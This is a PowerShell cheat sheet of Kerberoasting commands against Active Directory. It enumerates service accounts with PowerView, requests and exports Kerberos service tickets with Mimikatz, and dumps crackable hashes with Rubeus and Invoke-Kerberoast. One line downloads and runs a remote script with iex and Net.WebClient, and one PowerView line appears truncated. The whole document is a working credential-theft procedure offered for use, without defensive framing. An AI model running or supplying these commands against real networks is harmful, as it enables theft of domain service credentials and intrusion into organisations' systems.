# Import-Module ./PowerView.ps1
# Import-Module ./PowerSploit.psd1

$SPNs = Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts

#Get TGS in memory
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "" #Example: MSSQLSvc/mgmt.domain.local 
 
klist #List kerberos tickets in memory
 
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Powerview
 "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast